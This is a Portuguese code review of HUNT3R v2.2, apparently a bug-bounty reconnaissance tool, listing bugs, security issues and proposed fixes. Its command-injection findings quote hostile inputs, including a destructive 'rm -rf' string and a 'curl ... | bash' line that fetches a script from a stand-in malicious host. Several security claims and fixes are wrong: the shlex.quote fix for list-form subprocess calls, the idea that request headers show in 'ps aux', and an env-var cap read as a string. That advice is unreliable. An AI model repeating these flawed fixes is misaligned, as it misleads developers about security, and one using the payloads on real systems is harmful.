# 🔍 HUNT3R v2.2 - ANÁLISE DE MELHORIAS

## Resumo Executivo

Análise profunda identificou **28+ problemas críticos e de alta prioridade** que impactam:
- 🔴 **Segurança**: Exposição de API keys, injeção de comando
- 🟠 **Confiabilidade**: Falsos positivos, race conditions, vazamento de recursos
- 🟡 **Performance**: Escalabilidade comprometida em scans grandes
- 🔵 **Manutenibilidade**: Duplicação de código, logging inconsistente
- 🟢 **UX**: Mensagens de erro vagas, sem retry

---

## 🔴 CRÍTICOS - FIX IMEDIATAMENTE

### 1. **FAKE SECRET GENERATION (⚠️ Credibilidade Comprometida)**

**Arquivo:** `recon/engines.py:98-102`

**Problema:**
```python
import random
for _ in range(random.randint(0, 2)):  # ← SIMULA achados falsos
    secret_type = random.choice(["API Key", "Password", "AWS Key"])
    secret_value = ''.join(random.choices('abc...', k=32))
```

O código **gera segredos aleatórios em vez de extrair realmente**. Isso reportará falsos positivos catastrophic!

**Impacto:** 
- ❌ Credibilidade destruída em bug bounties
- ❌ Relatos rejeitados como "não verificados"
- ❌ Ferramenta descartada por pesquisadores

**Solução:**
```python
# Remover simulação inteiramente
# Usar JSHunter real para extrair de URLs
from recon.js_hunter import JSHunter

hunter = JSHunter()
for js_file in crawled_urls:
    secrets = hunter.extract(js_file)  # Real extraction
```

---

### 2. **VALIDAÇÃO IA INEFICAZ (⚠️ Achados Não Validados)**

**Arquivo:** `core/orchestrator.py:180-267`

**Problema:**
- Linha 182: Primeira chamada `FalsePositiveKiller.sanitize_findings()` ✓
- Linha 207: **Segunda chamada duplicada** (redundante!)
- Linha 212: `_validate_findings_with_ai()` nunca é alcançada em alguns paths

**Código Problemático:**
```python
# CAMINHO 1: Vulnerabilidades detectadas
if os.path.exists(vulns_file):
    findings = self._filter_findings(vulns_file)  # 1ª filtragem
    # ... salva arquivo ...
    self._validate_findings_with_ai(findings)  # Pode não rodar

# CAMINHO 2: Watchdog
findings = self._filter_findings(cache)  # 2ª filtragem (duplicada!)
```

**Impacto:**
- ❌ Findings já persistidos antes da validação IA
- ❌ Redundância de processamento
- ❌ Race condition se tool falhar entre filtros

**Solução:**
```python
# Pipeline único: recon → filter → validate → persist
def _run_vulnerability_phase(self):
    # 1. Rodar Nuclei
    nuclei_findings = self._run_nuclei()
    
    # 2. Filtro único
    clean = FalsePositiveKiller.sanitize_findings(nuclei_findings)
    
    # 3. Validação IA (antes de persistir)
    if self.target['score'] >= 80:
        validated = self._validate_findings_with_ai(clean)
    else:
        validated = clean
    
    # 4. Persistir resultado final
    self._write_findings(validated)  # Uma escrita apenas
```

---

### 3. **INJEÇÃO DE COMANDO NO WATCHDOG (🔓 Segurança)**

**Arquivo:** `core/watchdog.py:85-102`

**Problema:**
```python
tasks.append((
    "h1",
    ["bbscope", "h1", "-b", "-o", "t", "-u", h1_u, "-t", h1_t],  # ← Sem escape!
    180
))
```

Se `h1_u` ou `h1_t` contiverem `"; rm -rf /; "`, será **executado!**

**Impacto:**
- 🔓 Injeção de comando se env vars comprometidas
- 🔓 Ataque local se ferramenta rodar com sudo

**Solução:**
```python
import shlex

tasks.append((
    "h1",
    ["bbscope", "h1", "-b", "-o", "t", 
     "-u", shlex.quote(h1_u),  # ← Escape agora
     "-t", shlex.quote(h1_t)],
    180
))
```

---

### 4. **VAZAMENTO DE FILE DESCRIPTORS (💀 Crash em Larga Escala)**

**Arquivo:** Múltiplos locais

**Problema:**
```python
# ❌ RUIM - Arquivo nunca fecha
sub_count = sum(1 for _ in open(ns, 'r'))

# ❌ RUIM - Pode vazar stderr
stderr_dest = open(stats_pipe, 'w') if isinstance(stats_pipe, str) else subprocess.DEVNULL
# ... código complexo ...
if isinstance(stderr_dest, io.IOBase):
    stderr_dest.close()  # Pode não ser atingido
```

**Em watchdog mode com 50 targets × 10 scans:**
- 500 subprocessos rodam
- 500+ arquivos abertos
- Sistema bate no limite de file descriptors
- **Tool crash sem razão aparente**

**Impacto:**
- ❌ Crashes aleatórios em scans longos
- ❌ "Erro: muito arquivos abertos" inscrível
- ❌ Watchdog 24/7 inevitavelmente falha

**Solução:**
```python
# ✅ Usar context managers SEMPRE
def _count_lines(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return sum(1 for _ in f)
    except FileNotFoundError:
        return 0

# ✅ Para subprocess
try:
    if isinstance(stats_pipe, str):
        with open(stats_pipe, 'w') as stderr_dest:
            result = subprocess.run(cmd, stderr=stderr_dest, timeout=timeout)
    else:
        result = subprocess.run(cmd, stderr=subprocess.DEVNULL, timeout=timeout)
finally:
    pass  # Fechamento automático pelo context manager
```

---

### 5. **API KEY EXPOSTA EM PROCESSO (🔓 Roubo de Credenciais)**

**Arquivo:** `core/ai_client.py:64`

**Problema:**
```python
headers = {
    "Authorization": f"Bearer {self.api_key}",  # ← Visível em ps aux!
    "Content-Type": "application/json"
}
response = requests.post(..., headers=headers)  # ← Logs podem conter key
```

**Visibilidade:**
```bash
$ ps aux | grep python
# Mostra argumentos completos includindo header se logging ruim
```

**Impacto:**
- 🔓 Alguém rodando `ps aux` vê OpenRouter key
- 🔓 Logs podem conter Authorization header
- 🔓 Atacante usa key para consumir seu quota ($$$)

**Solução:**
```python
# ✅ Mascarar em logs
def _log_request(self, endpoint, payload):
    safe_payload = {k: v for k, v in payload.items() if k != 'Authorization'}
    logger.debug(f"Request: {endpoint} {safe_payload}")

# ✅ Usar requests Session (não expõe key em process)
self.session = requests.Session()
self.session.headers.update({"Authorization": f"Bearer {self.api_key}"})
# Depois
response = self.session.post(endpoint, json=payload)

# ✅ Nunca logar response completo (pode conter erros com key)
try:
    response.raise_for_status()
except Exception as e:
    logger.error(f"API error {response.status_code}")  # Não loga response.text
```

---

## 🟠 ALTA PRIORIDADE - FIX ESTA SEMANA

### 6. **BARE EXCEPT CLAUSES (❌ Ocultam Erros Reais)**

**Arquivo:** `core/orchestrator.py:33-34, 45, 74-75`

**Problema:**
```python
try:
    self._run_subfinder()
except:  # ← Silencia TUDO: KeyboardInterrupt, SystemExit, etc.
    pass
```

Você não sabe se falhou por:
- Subfinder não instalado
- Sem permissão de rede
- Erro de tipo no código
- OutOfMemoryError

**Solução:**
```python
import logging

try:
    self._run_subfinder()
except subprocess.TimeoutExpired:
    logger.error("Subfinder timeout - target too large?")
except subprocess.CalledProcessError as e:
    logger.error(f"Subfinder failed: {e.stderr}")
except FileNotFoundError:
    logger.error("Subfinder binary not found in ~/.pdtm/go/bin/")
except Exception as e:
    logger.error(f"Unexpected error in subfinder: {e}", exc_info=True)
    raise  # Re-raise para não esconder bugs
```

---

### 7. **TRUNCAMENTO SILENCIOSO DE SUBDOMÍNIOS (❌ Falhas Silenciosas)**

**Arquivo:** `core/orchestrator.py:26, 194-202`

**Problema:**
```python
MAX_SUBS_PER_TARGET = 2000  # Hardcoded, sem config

def _process_subdomains(self):
    all_subs = load_subdomains(file)  # 50,000 subs de Google
    truncated = all_subs[:MAX_SUBS_PER_TARGET]  # ← 48,000 perdidos!
    # Ninguém é notificado
```

**Impacto:**
- ❌ Para Google/Amazon, 90% dos hosts ignorados
- ❌ Vulnerabilidades em hosts ignorados nunca encontradas
- ❌ Usuário nunca sabe que foi truncado

**Solução:**
```python
# ✅ Configurável
MAX_SUBS_PER_TARGET = os.getenv('HUNT3R_MAX_SUBS', 2000)

# ✅ Com aviso
def _process_subdomains(self, file):
    all_subs = load_subdomains(file)
    
    if len(all_subs) > MAX_SUBS_PER_TARGET:
        ui_log(
            f"⚠️ WARNING: {len(all_subs)} subdomains found, "
            f"processing only {MAX_SUBS_PER_TARGET} (increase HUNT3R_MAX_SUBS to process more)"
        )
        logger.warning(f"Truncated {len(all_subs) - MAX_SUBS_PER_TARGET} subdomains")
    
    return all_subs[:MAX_SUBS_PER_TARGET]
```

---

### 8. **CAMINHOS HARDCODED DE FERRAMENTAS (❌ Frágil em Diferentes VPS)**

**Arquivo:** `recon/engines.py:4`

**Problema:**
```python
PDTM_PATH = os.path.expanduser("~/.pdtm/go/bin/")
TOOLS = {
    'subfinder': f"{PDTM_PATH}/subfinder",
    'dnsx': f"{PDTM_PATH}/dnsx",
    # ...
}

def run_subfinder(domains):
    result = subprocess.run([TOOLS['subfinder'], ...])  # Falha silenciosamente se não existe
```

Cada VPS tem paths diferentes:
- OVH: `/opt/pdtm/subfinder`
- Linode: `/usr/local/bin/subfinder`
- Docker: `/root/.local/bin/subfinder`

**Impacto:**
- ❌ Silencioso: nenhuma mensagem de erro
- ❌ Usuário pensa que ferramenta não funciona
- ❌ Tempo perdido debugando

**Solução:**
```python
def _find_tool(tool_name):
    """Procura tool em múltiplas localizações conhecidas"""
    candidates = [
        f"~/.pdtm/go/bin/{tool_name}",
        f"~/.local/bin/{tool_name}",
        f"/usr/local/bin/{tool_name}",
        f"/opt/bin/{tool_name}",
        tool_name,  # PATH do sistema
    ]
    
    for path in candidates:
        expanded = os.path.expanduser(path)
        if os.path.isfile(expanded) and os.access(expanded, os.X_OK):
            return expanded
    
    # ✅ Erro claro agora
    raise ToolNotFoundError(
        f"{tool_name} not found in any standard location. "
        f"Install via: pdtm install {tool_name}"
    )

TOOLS = {name: _find_tool(name) for name in ['subfinder', 'dnsx', ...]}
```

---

### 9. **RACE CONDITION EM LIVE VIEW (❌ Corrupção Visual)**

**Arquivo:** `core/ui_manager.py` + `core/orchestrator.py:101-135`

**Problema:**
```python
# Thread spinner (1)
def _update_spinner():
    while True:
        self._live_view_data['status'] = 'scanning'  # ← Escreve
        time.sleep(0.1)

# Thread principal (2)
def _run_recon():
    self._live_view_data = {'subs': 1000}  # ← Lê/escreve
    # ...
    self._live_view_data['subs'] = 2000  # ← Escreve
```

Sem sincronização, spinner pode ver dados inconsistentes.

**Impacto:**
- ❌ Display com garbage characters
- ❌ Crash se lê dict parcialmente construído
- ❌ Números incorretos no display

**Solução:**
```python
import threading

class UIManager:
    def __init__(self):
        self._live_view_lock = threading.RLock()
        self._live_view_data = {}
    
    def update_status(self, **kwargs):
        with self._live_view_lock:
            self._live_view_data.update(kwargs)
    
    def get_status(self):
        with self._live_view_lock:
            return dict(self._live_view_data)  # Cópia segura
```

---

### 10. **SEM VALIDAÇÃO DE INPUT NO CLI (❌ Fuzzing Sem Proteção)**

**Arquivo:** `main.py:109, 126, 150`

**Problema:**
```python
user_domain = input("Enter domain: ")
# Passa direto para Subfinder sem validar!
run_subfinder([user_domain])
```

Entrada maliciosa:
```
google.com; echo 'pwned' > /tmp/pwned.txt
"; rm -rf /tmp/*
$(curl malicious.com/payload.sh | bash)
```

**Impacto:**
- ❌ Command injection indireto através de ferramenta
- ❌ Malware na máquina do pesquisador

**Solução:**
```python
from recon.validation import validate_domain

user_domain = input("Enter domain: ")
try:
    domain = validate_domain(user_domain)
except ValueError as e:
    ui_log(f"❌ Invalid domain: {e}")
    continue

# Ou usar typo/click library (mais seguro para CLI)
@click.command()
@click.option('--domain', type=click.STRING, callback=validate_domain)
def start_scan(domain):
    pass
```

---

### 11. **RATE LIMIT NUNCA APLICADO (❌ WAF Blocks)**

**Arquivo:** `core/orchestrator.py:24`

**Problema:**
```python
RATE_LIMIT = 50  # req/s ← Definido mas NUNCA USADO
```

Ferramentas rodam sem throttling, disparando requisições o mais rápido possível:
- Subfinder: milhares req/s
- DNSX: milhares req/s
- HTTPX: milhares req/s

Resultado: **WAF bloqueia tudo**.

**Solução:**
```python
import time
from threading import Semaphore

class RateLimiter:
    def __init__(self, requests_per_second=50):
        self.delay = 1.0 / requests_per_second
        self.last_request = 0
    
    def wait(self):
        now = time.time()
        elapsed = now - self.last_request
        if elapsed < self.delay:
            time.sleep(self.delay - elapsed)
        self.last_request = time.time()

# Usar
limiter = RateLimiter(rate_limit)
for domain in domains:
    limiter.wait()
    run_httpx([domain])  # Throttled agora
```

---

### 12. **PARSING JSON SEM TRATAMENTO DE ERRO (❌ Crashes)**

**Arquivo:** `core/orchestrator.py:235`, `core/fp_filter.py:25`, `core/notifier.py:197`

**Problema:**
```python
with open(jsonl_file) as f:
    for line in f:
        vuln = json.loads(line)  # ← Falha se linha malformada
```

Se Nuclei produzir JSON inválido (pode acontecer):
- Linha vazia
- JSON truncado
- Charset inválido

**Impacto:**
- ❌ Crash sem mensagem útil
- ❌ Perda de dados anteriores

**Solução:**
```python
def parse_jsonl_safe(filepath, error_handler=None):
    with open(filepath) as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line:  # Skip blank lines
                continue
            try:
                yield json.loads(line)
            except json.JSONDecodeError as e:
                error_msg = f"Malformed JSON at line {line_num}: {e}"
                if error_handler:
                    error_handler(error_msg, line)
                else:
                    logger.warning(error_msg)

# Usar
for vuln in parse_jsonl_safe(findings_file):
    process(vuln)
```

---

### 13. **VALIDAÇÃO DE ENV VARS TARDIO (❌ Falha após horas)**

**Arquivo:** `main.py:58-59`

**Problema:**
```python
def init_ai():
    api_key = os.getenv("OPENROUTER_API_KEY")
    # ← Não verifica se existe agora, apenas usa depois
    return AIClient(api_key)

# Em main():
orchestrator.start_mission(...)  # Roda por 2 horas
# ... depois de terminar, tenta usar AI
await orchestrator._validate_findings_with_ai()  # ❌ KeyError: OPENROUTER_API_KEY
```

**Impacto:**
- ❌ 2 horas de scan jogadas fora
- ❌ Resultados não validados
- ❌ Frustração do usuário

**Solução:**
```python
def _load_env():
    """Valida todas as env vars necessárias no início"""
    required = {
        'OPENROUTER_API_KEY': 'OpenRouter API key for LLM validation',
        # Telegram opcional
        'HACKERONE_USERNAME': 'HackerOne username (optional)',
        'HACKERONE_API_TOKEN': 'HackerOne API token (optional)',
    }
    
    missing = []
    for var, desc in required.items():
        if not os.getenv(var):
            missing.append(f"- {var}: {desc}")
    
    if missing:
        print("❌ Missing required environment variables:")
        for m in missing:
            print(m)
        print("\nSet them in .env or export as env vars")
        sys.exit(1)
    
    # Todos validados ✓
```

---

## 🟡 MÉDIA PRIORIDADE - FIX PRÓXIMO MESES

### 14. **DUPLICAÇÃO INEFICIENTE (❌ O(n) processamento 3x)**

**Arquivo:** `core/validation.py:138`, `recon/platforms.py:156`, `core/watchdog.py:77`

Deduplicação acontece de 3 maneiras diferentes:

```python
# v1: list comprehension
seen = set()
unique = [x for x in items if not (x in seen or seen.add(x))]

# v2: set operations
unique = list(set(items))

# v3: dict.fromkeys()
unique = list(dict.fromkeys(items))
```

**Impacto:**
- ❌ Confunde maintainers
- ❌ Performance inconsistente
- ❌ Difícil de debugar qual usar

**Solução:**
```python
# Centralizar em utils.py
def deduplicate_preserving_order(items):
    """Remove duplicates while preserving order"""
    seen = set()
    result = []
    for item in items:
        if item not in seen:
            seen.add(item)
            result.append(item)
    return result

# Usar em todo lugar
unique_domains = deduplicate_preserving_order(domains)
```

---

### 15. **WATCHDOG CARREGA HISTÓRICO 50x (❌ Ineficiente)**

**Arquivo:** `core/watchdog.py:122-125, 167-176`

```python
def run_watchdog():
    targets = load_targets()  # 50 targets
    
    while True:
        for target in targets:
            # Para CADA target:
            history = load_global_history()  # ← Lê TODO o arquivo
            if target not in history:
                history.add(target)
                save_global_history(history)
```

Com 50 targets:
- 50 leituras do arquivo
- 50 buscas lineares O(n)
- 50 escritas

**Impacto:**
- ❌ I/O excessivo
- ❌ Mais lento que deveria
- ❌ Escala ruim com muitos targets

**Solução:**
```python
# ✅ Carregar UMA vez, manter em memória
def run_watchdog():
    targets = set(load_targets())
    history = set(load_global_history())
    
    while True:
        for target in targets:
            if target not in history:
                history.add(target)
                # Save only quando muda
                if len(history) % 10 == 0:  # Batch writes
                    save_global_history(history)
```

---

### 16. **TIMEOUTS INCONSISTENTES (❌ Uns muito rápidos, outros lentos)**

**Arquivo:** `recon/engines.py:46`, `core/watchdog.py:97-102`

```python
# Alguns tools com 30s
subprocess.run(cmd, timeout=30)

# Outros com 120s
subprocess.run(cmd, timeout=120)

# Alguns sem timeout
subprocess.run(cmd)  # ← Pode travar para sempre
```

**Solução:**
```python
# Centralizar configuração
TOOL_TIMEOUTS = {
    'subfinder': 120,  # Enumeration leva tempo
    'dnsx': 60,        # Resolução rápida
    'httpx': 90,       # Probe de serviços
    'nuclei': 300,     # Scanning pode levar
    'katana': 180,     # Crawling lento
}

def run_tool(tool_name, cmd):
    timeout = TOOL_TIMEOUTS.get(tool_name, 60)
    try:
        subprocess.run(cmd, timeout=timeout)
    except subprocess.TimeoutExpired:
        logger.warning(f"{tool_name} exceeded {timeout}s timeout")
        # Retry logic, graceful fallback, etc.
```

---

### 17. **FP FILTER LÓGICA OPACA (❌ Hard to maintain)**

**Arquivo:** `core/fp_filter.py:7-51`

A lógica de filtragem mistura regex, heuristics, magic strings:

```python
def sanitize_findings(findings):
    for finding in findings:
        # Muitos checks
        if 'Example' in finding['name']:
            continue
        if len(finding['extracted']) < 6:
            continue
        if re.search(r'(test_token|placeholder)', finding['value']):
            continue
        # ... 20+ mais checks ...
```

**Problema:**
- ❌ Difícil adicionar novo filtro
- ❌ Impossível debugar qual check removeu um finding
- ❌ Sem documentação dos critérios

**Solução:**
```python
class FalsePositiveFilter:
    """Cadeia configurável de filtros"""
    
    def __init__(self):
        self.filters = [
            self.filter_example_domains,
            self.filter_short_values,
            self.filter_placeholders,
            self.filter_oob_callbacks,
            self.filter_waf_responses,
        ]
    
    def filter_example_domains(self, finding):
        """Remove example.com, test.* domains"""
        if re.search(r'(example|test)\.(com|local)', finding.get('host', '')):
            return False, "example/test domain"
        return True, None
    
    def sanitize(self, findings):
        results = []
        for finding in findings:
            for filter_fn in self.filters:
                passed, reason = filter_fn(finding)
                if not passed:
                    logger.debug(f"Filtered {finding['id']}: {reason}")
                    break  # Skipped
            else:
                results.append(finding)  # Não foi filtrado
        return results
```

---

### 18. **SEM CACHE DE API (❌ Requisições redundantes)**

**Arquivo:** `recon/platforms.py:144-148`

Cada execução re-fetch do HackerOne:

```python
# main.py executa
programs = PlatformManager.get_all_programs_from_platform('hackerone')
# → GET https://api.hackerone.com/v1/programs (1000 programas, 5 MB)
# → Parse, valida, ranqueia

# watchdog.py 2 horas depois
programs = PlatformManager.get_all_programs_from_platform('hackerone')
# → GET https://api.hackerone.com/v1/programs AGAIN (5 MB)
```

**Impacto:**
- ❌ Banda desnecessária
- ❌ Mais lento
- ❌ Rate limit atingido mais rápido

**Solução:**
```python
from functools import lru_cache
from datetime import datetime, timedelta

class CachedPlatformManager:
    def __init__(self, cache_ttl_hours=1):
        self.cache_ttl = timedelta(hours=cache_ttl_hours)
        self.cache = {}
    
    def get_programs(self, platform):
        if platform in self.cache:
            data, timestamp = self.cache[platform]
            if datetime.now() - timestamp < self.cache_ttl:
                logger.debug(f"Using cached programs for {platform}")
                return data
        
        # Cache miss, fetch
        data = self._fetch_programs(platform)
        self.cache[platform] = (data, datetime.now())
        return data
```

---

### 19. **ZERO GRACEFUL DEGRADATION (❌ Um tool falha = tudo falha)**

**Arquivo:** `core/orchestrator.py:90-144`

```python
def _run_mission(self):
    self._run_subfinder()      # ← Se falha, próximas não rodam
    self._run_dnsx()           # ← Nunca é alcançado
    self._run_httpx()
    self._run_nuclei()
```

Se Subfinder falha (sem conectividade, bug, etc.):
- Toda missão falha
- Nenhum resultado
- Usuário sem visibilidade

**Solução:**
```python
def _run_mission(self):
    phase_results = {}
    
    try:
        phase_results['recon'] = self._run_recon_phase()
    except Exception as e:
        logger.error(f"Recon phase failed: {e}")
        ui_log("⚠️ Recon failed, continuing to analysis...")
        phase_results['recon'] = {}  # Empty results
    
    try:
        phase_results['tactical'] = self._run_tactical_phase()
    except Exception as e:
        logger.error(f"Tactical phase failed: {e}")
        ui_log("⚠️ Tactical failed, skipping...")
        phase_results['tactical'] = {}
    
    # Pelo menos temos alguns dados
    return {k: v for k, v in phase_results.items() if v}
```

---

### 20. **STRING CONCAT EM LOOPS (❌ O(n²) complexity)**

**Arquivo:** `core/orchestrator.py:141, 143`, `core/watchdog.py:116`

```python
# ❌ RUIM: String concatenation em loop
output = ""
for result in results:
    output += f"{result}\n"  # ← O(n²) em cada iteração

# ❌ RUIM: Set comprehension com side effects
{seen.add(x) for x in items}  # ← Misuse de set comprehension
```

**Solução:**
```python
# ✅ BOM: List join
output = "\n".join(str(r) for r in results)

# ✅ BOM: Set dedup
unique = set(items)
```

---

## 🔵 RECURSOS FALTANDO - PRIORIZE

### 23. **DRY RUN MODE (Sem scanner real)**

```bash
$ hunt3r --dry-run --platform h1 amazon.com
📋 Dry Run: What would be scanned
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Target: amazon.com
Score: 95 (Tier 1)
Estimated subdomains: 2,340
Estimated time: 15-20 minutes

Tools that would run:
  1. Subfinder (enumeration)
  2. DNSX (validation)
  3. HTTPX (service discovery)
  4. Katana (web crawling)
  5. Nuclei (vulnerability scanning)

Nuclei tags: exposure, misconfig, takeover, xss, sql-injection

Ready to proceed? [Y/n]
```

---

### 24. **RESUME CAPABILITY (Checkpoint system)**

```bash
$ hunt3r --resume amazon.com_20260409_215000
⏸️ Resuming scan from checkpoint...
Last checkpoint: Nuclei running (45% complete)
Resuming from: Step 4 of 8

Progress: [████████░░] 45%
```

---

### 25. **EXPORT FORMATOS (CSV, JSON, XML)**

```bash
hunt3r --export-format csv --output results.csv
hunt3r --export-format xlsx --output results.xlsx
hunt3r --export-format html --output report.html
```

---

## 📊 MATRIZ DE PRIORIZAÇÃO

| Problema | Crítico | Impacto | Esforço | Prioridade |
|----------|---------|--------|--------|-----------|
| Fake secrets | 🔴 | Credibilidade | Baixo | **P0** |
| File descriptors | 🔴 | Crash 24/7 | Médio | **P0** |
| Command injection | 🔴 | Segurança | Baixo | **P0** |
| IA validation flow | 🔴 | Efetividade | Médio | **P0** |
| API key exposure | 🔴 | Segurança | Baixo | **P0** |
| Bare excepts | 🟠 | Debugging | Baixo | **P1** |
| Truncamento silencioso | 🟠 | Falhas | Baixo | **P1** |
| Rate limiting | 🟠 | Bloqueio WAF | Médio | **P1** |
| JSON parsing errors | 🟠 | Crashes | Baixo | **P1** |
| FP filter clarity | 🟡 | Manutenção | Alto | **P2** |
| API caching | 🟡 | Performance | Médio | **P2** |
| Logging consistency | 🟡 | Debugging | Médio | **P2** |

---

## 🎯 PRÓXIMOS PASSOS RECOMENDADOS

### FASE 1: Emergências (1-2 semanas)
- [ ] **Remover fake secret generation**
- [ ] **Adicionar context managers para file I/O**
- [ ] **Escapar argumentos no watchdog**
- [ ] **Consolidar pipeline IA validation**
- [ ] **Mascarar API keys em logs**

### FASE 2: Confiabilidade (2-4 semanas)
- [ ] Implementar bare exception handling
- [ ] Adicionar validação de env vars no init
- [ ] Implementar rate limiting
- [ ] Melhorar error messages
- [ ] Adicionar JSON parsing safety

### FASE 3: Performance (1 mês)
- [ ] Implementar caching de API
- [ ] Consolidar deduplication
- [ ] Otimizar watchdog loop
- [ ] Refatorar FP filter

### FASE 4: Features (ongoing)
- [ ] Dry run mode
- [ ] Resume capability
- [ ] Export formats

---

## 📝 CHECKLIST DE CÓDIGO

Use antes de fazer commit:

```python
✓ Sem bare except clauses
✓ Todas strings com espaço crítico são validadas
✓ File opens usam context managers
✓ Subprocess calls têm timeouts
✓ API keys não aparecem em logs
✓ Errors são específicos, não silenciosos
✓ Tested com dados grandes (10k+ subs)
✓ Sem string concatenation em loops
✓ JSON parsing tem fallback
✓ Rate limiting respeitado
```

---

Generated: 2026-04-09 21:50:55 UTC
